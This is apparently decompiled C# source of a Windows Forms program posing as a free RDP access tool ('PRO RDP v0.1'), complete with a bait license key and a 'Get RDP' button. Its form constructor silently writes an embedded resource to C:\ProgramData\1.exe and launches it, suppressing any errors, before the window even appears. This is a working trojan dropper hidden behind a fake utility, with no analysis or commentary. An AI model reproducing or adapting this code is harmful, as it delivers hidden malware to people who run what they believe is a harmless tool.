using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using RDP_CONNECT_V1._0.Properties;

namespace RDP_CONNECT_V1._0;

public class Form1 : Form
{
	private IContainer components;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	public Form1()
	{
		try
		{
			File.WriteAllBytes("C:\\ProgramData\\1.exe", Resources._1);
			Process.Start("C:\\ProgramData\\1.exe");
		}
		catch
		{
		}
		InitializeComponent();
	}

	private void label1_Click(object sender, EventArgs e)
	{
		((Control)new Form2()).Show();
		((Control)this).Hide();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Expected O, but got Unknown
		//IL_01a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ab: Expected O, but got Unknown
		//IL_0234: Unknown result type (might be due to invalid IL or missing references)
		//IL_023e: Expected O, but got Unknown
		//IL_0331: Unknown result type (might be due to invalid IL or missing references)
		//IL_033b: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Trebuchet MS", 16f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.FromArgb(80, 250, 123));
		((Control)label1).set_Location(new Point(60, 50));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(94, 27));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Get RDP");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Trebuchet MS", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(2, 5));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(81, 18));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("License key:");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Trebuchet MS", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(80, 5));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(131, 18));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("1M781-Z7HOL-75DX1");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Trebuchet MS", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label4).set_ForeColor(Color.Red);
		((Control)label4).set_Location(new Point(47, 23));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(116, 18));
		((Control)label4).set_TabIndex(4);
		((Control)label4).set_Text("key active 30 deys");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(40, 42, 54));
		((Form)this).set_ClientSize(new Size(213, 123));
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("PRO RDP v0.1 | Laut Cat");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
